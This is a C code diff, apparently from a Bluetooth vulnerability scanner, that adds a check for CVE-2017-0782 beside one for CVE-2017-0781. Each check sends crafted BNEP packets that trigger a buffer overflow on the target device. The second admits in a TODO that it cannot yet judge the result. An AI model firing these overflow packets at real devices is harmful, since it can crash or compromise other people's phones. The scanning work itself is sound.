@@ -221,11 +221,12 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     addr.l2_family = AF_BLUETOOTH;
     addr.l2_psm = htobs(BNEP_PSM);
 
+    // Create a connection request with a UUID size of zero
     conn_req = (struct bnep_setup_conn_req *) packet;
     conn_req->type = BNEP_CONTROL_W_EXTENSION;
     conn_req->ctrl = BNEP_SETUP_CONN_REQ;
     conn_req->uuid_size = 0;
-
+    // Copy overflow payload
     memset(&(conn_req->service), overflow_payload_val, BNEP_OVERFLOW_PAYLOAD_LEN);
 
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
@@ -233,6 +234,70 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
         if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
             return CVE_CHECK_ERR;
+    close(sd);
+    return 0;
+}
+
+int is_vulnerable_to_cve_2017_0782(bdaddr_t *target)
+{
+    struct sockaddr_l2 addr = { 0 };
+    int sd;
+    uint16_t dst_svc_uuid, src_svc_uuid;
+    char buf[BNEP_BUFFER_LEN], *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t));
+    struct bnep_setup_conn_req *conn_req;
+    struct bnep_control_rsp *conn_rsp;
+
+    // Return a negative integer indicating failure to create socket
+    if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
+        return CVE_CHECK_ERR;
+
+    addr.l2_bdaddr = *target;
+    addr.l2_family = AF_BLUETOOTH;
+    addr.l2_psm = htobs(BNEP_PSM);
+    // Create a valid connection request
+    memset(packet, 0x00, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t));
+    conn_req = (struct bnep_setup_conn_req *) packet;
+    conn_req->type = BNEP_CONTROL;
+    conn_req->ctrl = BNEP_SETUP_CONN_REQ;
+    conn_req->uuid_size = sizeof(uint16_t);
+    // Set service UUIDs
+    dst_svc_uuid = htons(BNEP_SVC_PANU);
+    memcpy(packet + sizeof(struct bnep_setup_conn_req), &dst_svc_uuid, sizeof(uint16_t));
+    src_svc_uuid = htons(BNEP_SVC_NAP);
+    memcpy(packet + sizeof(struct bnep_setup_conn_req) + sizeof(uint16_t), &src_svc_uuid, sizeof(uint16_t));
+    // If a connection is refused, it could indicates that BNEP connections are
+    // rejected and the device is not vulnerable
+    if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+        return 0;
+    if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + 2 * sizeof(uint16_t)) < 0)
+        return CVE_CHECK_ERR;
+    // Wait for connection response
+    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+        return CVE_CHECK_ERR;
+
+    conn_rsp = (struct bnep_control_rsp *) buf;
+
+    // If the connection response is not successful, the device is not vulnerable
+    if (conn_rsp->resp != 0)
+        return 0;
+    // Free the connection request packet and reallocate memory for the overflow packet
+    free(packet);
+    packet = (char *) malloc(BNEP_ETH_OVERFLOW_LEN);
+    // Zero out the memory
+    memset(packet, 0, BNEP_ETH_OVERFLOW_LEN);
+    // Set BNEP packet type
+    packet[0] = BNEP_ETH_CMP_W_EXTENSION;
+    // Set the extension length and overflow payload
+    packet[4] = 0x0A;
+    packet[5] = 0x10;
+    // Send the overflow packet
+    if (write(sd, packet, BNEP_ETH_OVERFLOW_LEN) < 0)
+        return CVE_CHECK_ERR;
+    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+        return CVE_CHECK_ERR;
+
+    // TODO: Determine if it is possible to see if the vulnerability is present
+
     close(sd);
     return 0;
 }
